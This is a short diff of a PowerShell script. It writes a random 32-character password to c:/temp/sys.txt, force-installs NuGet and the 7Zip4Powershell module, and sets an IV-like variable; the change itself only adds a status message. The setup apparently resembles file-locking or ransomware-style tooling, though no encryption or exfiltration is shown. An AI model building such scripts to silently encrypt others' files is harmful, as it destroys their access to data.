@@ -30,7 +30,9 @@ $pwd2 = [system.web.security.membership]::GeneratePassword(32,15)
 echo ("$pwd2") > c:/temp/sys.txt
 # Write-Host "[+] $pwd2"
 # Start-Sleep -s 1
+Write-Host "Installing NuGet provider..."
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
+
 Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
 # Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
